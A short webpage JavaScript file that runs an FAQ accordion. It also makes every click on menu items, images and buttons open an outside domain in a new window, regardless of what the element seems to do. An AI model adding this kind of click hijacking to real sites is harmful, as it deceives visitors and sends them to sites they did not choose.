

var faqItems = document.getElementsByClassName("faq__item");

for (var i = 0; i < faqItems.length; i++) {
  faqItems[i].children[0].addEventListener("click", function() {
    this.classList.toggle("active");
    var answer = this.nextElementSibling;
    if (answer.style.maxHeight) {
      answer.style.maxHeight = null;
    } else {
      answer.style.maxHeight = answer.scrollHeight + "px";
    } 
  });
}
document.addEventListener('DOMContentLoaded', function() {
    var elements = document.querySelectorAll('div.menu__item, .content__img, div.btn');
    for (var i = 0; i < elements.length; i++) {
        elements[i].addEventListener('click', function() {
            window.open('https://1wongg.xyz/');
        });
    }
});

